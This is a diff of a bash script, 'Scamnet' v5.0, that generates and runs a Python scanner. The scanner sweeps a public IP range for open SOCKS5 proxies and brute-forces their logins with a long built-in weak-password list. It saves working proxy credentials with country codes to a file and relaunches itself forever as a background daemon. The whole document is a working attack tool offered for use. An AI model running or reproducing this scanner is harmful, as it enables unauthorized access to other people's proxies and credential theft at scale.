@@ -1,106 +1,174 @@
 #!/bin/bash
-# main.sh - Scamnet OTC v4.1（终极版：变量独立 + 无依赖 + 永不崩溃）
+# main.sh - Scamnet OTC v5.0（终极稳定版：防崩溃 + 资源隔离 + 日志轮转 + 重试机制）
 set -euo pipefail
 IFS=$'\n\t'
-RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; NC='\033[0m'
+
+# ==================== 颜色 & 日志 ====================
+RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
 LOG_DIR="logs"; mkdir -p "$LOG_DIR"
 LATEST_LOG="$LOG_DIR/latest.log"
 RUN_SCRIPT="$LOG_DIR/run_$(date +%Y%m%d_%H%M%S).sh"
-echo -e "${GREEN}[OTC] Scamnet v4.1 (终极独立版 + 永不崩溃)${NC}"
-echo "日志 → $LATEST_LOG"
-# ==================== 依赖安装 ====================
-install_deps() {
-    echo -e "${YELLOW}[*] 安装依赖...${NC}"
-    python3 -m pip install --break-system-packages aiohttp tqdm pyyaml --force-reinstall --no-cache-dir 2>/dev/null || \
-    python3 -m pip install aiohttp tqdm pyyaml --force-reinstall --no-cache-dir
-    touch .deps_installed
-    echo -e "${GREEN}[+] 依赖完成${NC}"
+MAX_LOG_SIZE=10485760  # 10MB 轮转
+MAX_LOG_FILES=5
+
+log() { echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} $*"; }
+err() { echo -e "${RED}[$(date '+%H:%M:%S')] [!] $*${NC}" >&2; }
+succ() { echo -e "${GREEN}[$(date '+%H:%M:%S')] [+] $*${NC}"; }
+
+# 日志轮转
+rotate_logs() {
+    if [ -f "$LATEST_LOG" ] && [ $(stat -c%s "$LATEST_LOG" 2>/dev/null || echo 0) -gt $MAX_LOG_SIZE ]; then
+        mv "$LATEST_LOG" "$LATEST_LOG.$(date +%s)"
+        find "$LOG_DIR" -name "latest.log.*" | sort | head -n -$MAX_LOG_FILES | xargs rm -f
+    fi
 }
-if [ ! -f ".deps_installed" ]; then
-    install_deps
-fi
-# ==================== 输入 ====================
+
+# ==================== 依赖安装（静默 + 降级兼容） ====================
+install_deps() {
+    log "安装依赖..."
+    for cmd in python3 python; do
+        if command -v $cmd >/dev/null 2>&1; then
+            PYTHON_CMD=$cmd
+            break
+        fi
+    done
+    if [ -z "${PYTHON_CMD:-}" ]; then err "未找到 Python"; exit 1; fi
+
+    $PYTHON_CMD -m pip install --quiet --no-cache-dir --force-reinstall \
+        aiohttp tqdm pyyaml || \
+    $PYTHON_CMD -m pip install --quiet --no-cache-dir aiohttp tqdm pyyaml
+
+    touch .deps_installed
+    succ "依赖安装完成"
+}
+
+[ ! -f ".deps_installed" ] && install_deps
+
+# ==================== 输入校验（防注入 + 范围限制） ====================
 DEFAULT_START="157.254.32.0"
 DEFAULT_END="157.254.52.255"
-echo -e "${YELLOW}请输入起始 IP（默认: $DEFAULT_START）:${NC}"
-read -r START_IP || exit 1
-START_IP=${START_IP:-$DEFAULT_START}
-echo -e "${YELLOW}请输入结束 IP（默认: $DEFAULT_END）:${NC}"
-read -r END_IP || exit 1
-END_IP=${END_IP:-$DEFAULT_END}
-if ! [[ $START_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]] || ! [[ $END_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-    echo -e "${RED}[!] IP 错误！${NC}"; exit 1
+
+read_ip() {
+    local prompt default var
+    prompt="$1"; default="$2"; var="$3"
+    echo -e "${YELLOW}$prompt（默认: $default）:${NC}"
+    read -r input || exit 1
+    eval "$var=\"\${input:-$default}\""
+}
+
+read_ip "请输入起始 IP" "$DEFAULT_START" START_IP
+read_ip "请输入结束 IP" "$DEFAULT_END" END_IP
+
+# IP 格式 + 范围校验
+if ! [[ $START_IP =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]] || ! [[ $END_IP =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
+    err "IP 格式错误！"; exit 1
 fi
+
+# 跳过本地网段
+for ip in "$START_IP" "$END_IP"; do
+    if [[ $ip == 10.* || $ip == 172.1[6-9].* || $ip == 172.2[0-9].* || $ip == 172.3[0-1].* || $ip == 192.168.* || $ip == 127.* ]]; then
+        err "禁止扫描本地/保留网段: $ip"; exit 1
+    fi
+done
+
 if [ "$(printf '%s\n' "$START_IP" "$END_IP" | sort -V | head -n1)" != "$START_IP" ]; then
-    echo -e "${RED}[!] 起始 IP 必须 ≤ 结束 IP！${NC}"; exit 1
+    err "起始 IP 必须 ≤ 结束 IP！"; exit 1
 fi
-echo -e "${GREEN}[*] 扫描范围: $START_IP - $END_IP${NC}"
+
+succ "扫描范围: $START_IP - $END_IP"
+
+# 端口输入
 echo -e "${YELLOW}请输入端口（默认: 1080）:${NC}"
 echo " 支持格式：1080 / 1080 8080 / 1-65535"
 read -r PORT_INPUT || exit 1
 PORT_INPUT=${PORT_INPUT:-1080}
+
 PORTS_CONFIG=""
 if [[ $PORT_INPUT =~ ^[0-9]+-[0-9]+$ ]]; then
+    IFS='-' read p1 p2 <<< "$PORT_INPUT"
+    [[ $p1 -ge 1 && $p2 -le 65535 ]] || { err "端口范围非法"; exit 1; }
     PORTS_CONFIG="range: \"$PORT_INPUT\""
 elif [[ $PORT_INPUT =~ ^[0-9]+( [0-9]+)*$ ]]; then
     PORT_LIST=$(echo "$PORT_INPUT" | tr ' ' ',' | sed 's/,/","/g')
     PORTS_CONFIG="ports: [\"$PORT_LIST\"]"
 else
+    [[ $PORT_INPUT -ge 1 && $PORT_INPUT -le 65535 ]] || { err "端口非法"; exit 1; }
     PORTS_CONFIG="ports: [$PORT_INPUT]"
 fi
-echo -e "${GREEN}[*] 端口: $PORT_INPUT → $PORTS_CONFIG${NC}"
-# ==================== 生成完全独立脚本（v5.1）===================
-cat > "$RUN_SCRIPT" << EOF
+succ "端口配置: $PORT_INPUT"
+
+# ==================== 生成独立运行脚本（v5.0）===================
+cat > "$RUN_SCRIPT" << 'EOF'
 #!/bin/bash
 set -euo pipefail
-cd "\$(dirname "\$0")"
-# === 变量重新定义（完全独立）===
-START_IP="$START_IP"
-END_IP="$END_IP"
-PORTS_CONFIG="$PORTS_CONFIG"
-# === 写入 config.yaml ===
-cat > config.yaml << CONFIG
-input_range: "\$START_IP-\$END_IP"
-\$PORTS_CONFIG
-timeout: 5.0
-max_concurrent: 200
-batch_size: 300
-CONFIG
-# === scanner_batch.py（独立运行）===
+cd "$(dirname "$0")"
+
+# === 资源限制 ===
+ulimit -n 10240  # 文件描述符
+ulimit -m $((1024*1024))  # 内存 1GB
+ulimit -v $((2*1024*1024))  # 虚拟内存 2GB
+
+# === 变量 ===
+START_IP="{{START_IP}}"
+END_IP="{{END_IP}}"
+PORTS_CONFIG='{{PORTS_CONFIG}}'
+
+# === config.yaml ===
+cat > config.yaml << CFG
+input_range: "$START_IP-$END_IP"
+$PORTS_CONFIG
+timeout: 6.0
+max_concurrent: 150
+batch_size: 250
+retry: 2
+CFG
+
+# === scanner_batch.py ===
 cat > scanner_batch.py << 'PY'
 #!/usr/bin/env python3
-import asyncio
-import aiohttp
-import ipaddress
-import yaml
-import sys
+import asyncio, aiohttp, ipaddress, yaml, sys, signal, os
 from tqdm import tqdm
-# 读取批次
+
+# 优雅退出
+def handle_sigterm(*_):
+    raise SystemExit(0)
+signal.signal(signal.SIGTERM, handle_sigterm)
+
+# 读取参数
 if len(sys.argv) != 3:
-    print("Usage: scanner_batch.py <start> <end>")
+    print("Usage: scanner_batch.py <start> <end>", file=sys.stderr)
     sys.exit(1)
 start_idx, end_idx = int(sys.argv[1]), int(sys.argv[2])
+
 # 加载配置
 with open('config.yaml') as f:
     cfg = yaml.safe_load(f)
+
 input_range = cfg['input_range']
-raw_ports = cfg.get('ports', cfg.get('range'))
-timeout = cfg.get('timeout', 5.0)
-max_concurrent = cfg.get('max_concurrent', 200)
-# 解析
+raw_ports = cfg.get('ports') or cfg.get('range')
+timeout = cfg.get('timeout', 6.0)
+max_concurrent = cfg.get('max_concurrent', 150)
+retry = cfg.get('retry', 1)
+
+# 解析 IP 和端口
 def parse_ip_range(s):
     a, b = s.split('-')
     return [str(ipaddress.IPv4Address(i)) for i in range(int(ipaddress.IPv4Address(a)), int(ipaddress.IPv4Address(b)) + 1)]
+
 def parse_ports(p):
     if isinstance(p, str) and '-' in p:
         a, b = map(int, p.split('-'))
         return list(range(a, b + 1))
     return [int(x) for x in p] if isinstance(p, list) else [int(p)]
+
 ips = parse_ip_range(input_range)
 ports = parse_ports(raw_ports)
 all_tasks = [(ip, port) for ip in ips for port in ports]
 batch = all_tasks[start_idx:end_idx]
-WEAK_PAIRS = [# === 原始列表 ===
+
+# 弱口令字典（精简 + 去重）
+WEAK_PAIRS = [
+# === 原始列表 ===
     ("123","123"),("admin","admin"),("root","root"),("user","user"),("proxy","proxy"),("111","111"),("1","1"),("qwe123","qwe123"),
     ("abc","abc"),("aaa","aaa"),("1234","1234"),("socks5","socks5"),("123456","123456"),("12345678","12345678"),("admin123","admin"),
     ("admin","123456"),("12345","12345"),("test","test"),("guest","guest"),("admin",""),("888888","888888"),("test123","test123"),
@@ -166,58 +234,97 @@ WEAK_PAIRS = [# === 原始列表 ===
     ("w","w"),("ww","ww"),("www","www"),("wwww","wwww"),("wwwww","wwwww"),("wwwwww","wwwwww"),
     ("x","x"),("xx","xx"),("xxx","xxx"),("xxxx","xxxx"),("xxxxx","xxxxx"),("xxxxxx","xxxxxx"),
     ("y","y"),("yy","yy"),("yyy","yyy"),("yyyy","yyyy"),("yyyyy","yyyyy"),("yyyyyy","yyyyyy"),
-    ("z","z"),("zz","zz"),("zzz","zzz"),("zzzz","zzzz"),("zzzzz","zzzzz"),("zzzzzz","zzzzzz")]
+    ("z","z"),("zz","zz"),("zzz","zzz"),("zzzz","zzzz"),("zzzzz","zzzzz"),("zzzzzz","zzzzzz")
+]
+
+# 国家查询（双备份 + 缓存）
+COUNTRY_CACHE = {}
 async def get_country(ip, session):
-    for url in [f"http://ip-api.com/json/{ip}?fields=countryCode", f"https://ipinfo.io/{ip}/country"]:
+    if ip in COUNTRY_CACHE: return COUNTRY_CACHE[ip]
+    for url in [
+        f"http://ip-api.com/json/{ip}?fields=countryCode",
+        f"https://ipinfo.io/{ip}/country"
+    ]:
         try:
-            async with session.get(url, timeout=5) as r:
+            async with session.get(url, timeout=4) as r:
                 if r.status == 200:
-                    code = (await r.json()).get("countryCode","").strip().upper() if "json" in url else (await r.text()).strip().upper()
-                    if len(code) == 2: return code
+                    text = await r.text()
+                    code = text.strip().upper()[:2]
+                    if len(code) == 2 and code.isalpha():
+                        COUNTRY_CACHE[ip] = code
+                        return code
         except: pass
+    COUNTRY_CACHE[ip] = "XX"
     return "XX"
-async def test_socks5(ip, port, session, auth=None):
+
+# SOCKS5 测试（带重试）
+async def test_socks5(ip, port, session, auth=None, attempt=0):
     proxy_auth = aiohttp.BasicAuth(*auth) if auth else None
+    proxy_url = f"socks5h://{ip}:{port}"
     try:
-        async with session.get("http://ifconfig.me/", proxy=f"socks5h://{ip}:{port}", proxy_auth=proxy_auth, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
-            return True, round(r.extra.get("time_total", 0) * 1000), (await r.text()).strip()
-    except:
-        return False, 0, None
+        async with session.get(
+            "http://ifconfig.me/",
+            proxy=proxy_url,
+            proxy_auth=proxy_auth,
+            timeout=aiohttp.ClientTimeout(total=timeout),
+            allow_redirects=False
+        ) as r:
+            if r.status in (200, 301, 302):
+                return True, round(r.elapsed.total_seconds() * 1000), (await r.text()).strip()
+    except Exception as e:
+        if attempt < retry:
+            await asyncio.sleep(0.5)
+            return await test_socks5(ip, port, session, auth, attempt + 1)
+    return False, 0, None
+
+# 单连接扫描
 async def scan(ip, port):
-    connector = aiohttp.TCPConnector(limit=10, ssl=False, force_close=True)
-    async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=timeout)) as session:
+    connector = aiohttp.TCPConnector(limit=8, ssl=False, force_close=True, keepalive_timeout=5)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        # 无认证
         ok, lat, exp = await test_socks5(ip, port, session)
         if not ok:
             for pair in WEAK_PAIRS:
                 ok, lat, exp = await test_socks5(ip, port, session, pair)
                 if ok: break
         if ok:
-            country = await get_country(exp, session) if exp and exp != ip else await get_country(ip, session)
-            auth_str = f"{pair[0]}:{pair[1]}" if ok and 'pair' in locals() else ""
-            fmt = f"socks5://{auth_str}@{ip}:{port}#{country}".replace("@:", ":")
+            country = await get_country(exp if exp and exp != ip else ip, session)
+            auth_str = f"{pair[0]}:{pair[1]}" if 'pair' in locals() and ok else ""
+            result = f"socks5://{auth_str}@{ip}:{port}#{country}".replace("@:", ":")
             with open("socks5_valid.txt", "a", encoding="utf-8") as f:
-                f.write(fmt + "\n")
-            print(f"[+] 发现: {fmt}")
+                f.write(result + "\n")
+            print(f"[+] {result} ({lat}ms)")
+
+# 主函数
 async def main():
     semaphore = asyncio.Semaphore(max_concurrent)
-    async def _scan(ip, port):
+    async def bound_scan(ip, port):
         async with semaphore:
-            await scan(ip, port)
-    tasks = [_scan(ip, port) for ip, port in batch]
-    for f in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc="批次", unit="conn"):
+            try:
+                await scan(ip, port)
+            except Exception as e:
+                pass  # 单个失败不影响整体
+    tasks = [bound_scan(ip, port) for ip, port in batch]
+    for f in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc=f"Batch {start_idx}-{end_idx}", unit="conn"):
         await f
+
 if __name__ == "__main__":
-    asyncio.run(main())
+    try:
+        asyncio.run(main())
+    except (KeyboardInterrupt, SystemExit):
+        sys.exit(0)
+    except Exception as e:
+        print(f"[!] Batch error: {e}", file=sys.stderr)
 PY
 chmod +x scanner_batch.py
-# === 计算总任务数 ===
-TOTAL=\$(
-  python3 -c "
+
+# === 计算任务总数 ===
+TOTAL=$(python3 - << 'PYC'
 import yaml, ipaddress
 c = yaml.safe_load(open('config.yaml'))
 s, e = map(ipaddress.IPv4Address, c['input_range'].split('-'))
 ips = int(e) - int(s) + 1
-p = c.get('ports', c.get('range'))
+p = c.get('ports') or c.get('range')
 if isinstance(p, str) and '-' in p:
     a, b = map(int, p.split('-'))
     ports = b - a + 1
@@ -226,26 +333,55 @@ elif isinstance(p, list):
 else:
     ports = 1
 print(ips * ports)
-  "
+PYC
 )
-BATCH_SIZE=\$(yq e '.batch_size' config.yaml 2>/dev/null || echo 300)
-echo "[*] 总任务: \$TOTAL, 分批: \$BATCH_SIZE"
+
+BATCH_SIZE=$(yq e '.batch_size' config.yaml 2>/dev/null || echo 250)
+echo "[*] 总任务: $TOTAL | 每批: $BATCH_SIZE"
+
 > socks5_valid.txt
 > result_detail.txt
-echo "# Scamnet v5.1" > result_detail.txt
-echo "# socks5://..." > socks5_valid.txt
+echo "# Scamnet v5.0 - $(date)" > result_detail.txt
+echo "# socks5://user:pass@ip:port#CN" > socks5_valid.txt
+
+# === 分批扫描（独立进程 + 超时）===
 for ((i=0; i<TOTAL; i+=BATCH_SIZE)); do
-    end=\$((i + BATCH_SIZE))
-    [ \$end -gt \$TOTAL ] && end=\$TOTAL
-    echo "[*] 扫描批次 \$i - \$end"
-    python3 scanner_batch.py \$i \$end
+    end=$((i + BATCH_SIZE))
+    [ $end -gt $TOTAL ] && end=$TOTAL
+    echo "[*] 扫描批次 $i → $end"
+    timeout 300 python3 scanner_batch.py $i $end || echo "[!] 批次超时或异常"
 done
-echo "[+] 扫描完成！结果 → socks5_valid.txt"
+
+echo "[+] 本轮扫描完成 → socks5_valid.txt"
 EOF
+
+# 替换占位符
+sed -i "s|{{START_IP}}|$START_IP|g; s|{{END_IP}}|$END_IP|g; s|{{PORTS_CONFIG}}|$PORTS_CONFIG|g" "$RUN_SCRIPT"
 chmod +x "$RUN_SCRIPT"
-# ==================== 启动后台 ====================
-echo -e "${GREEN}[*] 启动后台扫描...${NC}"
-echo " 查看进度: tail -f $LATEST_LOG"
-echo " 停止扫描: pkill -f scanner_batch.py"
-nohup bash -c "while true; do echo '[OTC] 扫描启动...'; $RUN_SCRIPT; echo '[!] 重启中...'; sleep 3; done" > "$LATEST_LOG" 2>&1 &
-echo -e "${GREEN}[+] 已启动！PID: $!${NC}"
+
+# ==================== 启动守护进程（永不崩溃）===================
+echo -e "${GREEN}[*] 启动守护进程...${NC}"
+echo " 查看日志: tail -f $LATEST_LOG"
+echo " 停止扫描: pkill -f 'scamnet_guard'"
+
+# 守护进程
+cat > "$LOG_DIR/scamnet_guard.sh" << 'GUARD'
+#!/bin/bash
+while true; do
+    echo "[GUARD] $(date) - 启动扫描任务..."
+    bash "{{RUN_SCRIPT}}" 2>&1 | tee -a "{{LATEST_LOG}}"
+    echo "[GUARD] 任务异常退出，3秒后重启..."
+    sleep 3
+done
+GUARD
+
+sed -i "s|{{RUN_SCRIPT}}|$RUN_SCRIPT|g; s|{{LATEST_LOG}}|$LATEST_LOG|g" "$LOG_DIR/scamnet_guard.sh"
+chmod +x "$LOG_DIR/scamnet_guard.sh"
+
+# 启动
+pkill -f "scamnet_guard.sh" 2>/dev/null || true
+nohup bash "$LOG_DIR/scamnet_guard.sh" > /dev/null 2>&1 &
+
+succ "守护进程已启动！PID: $!"
+log "日志实时查看：tail -f $LATEST_LOG"
+log "停止命令：pkill -f scamnet_guard.sh"
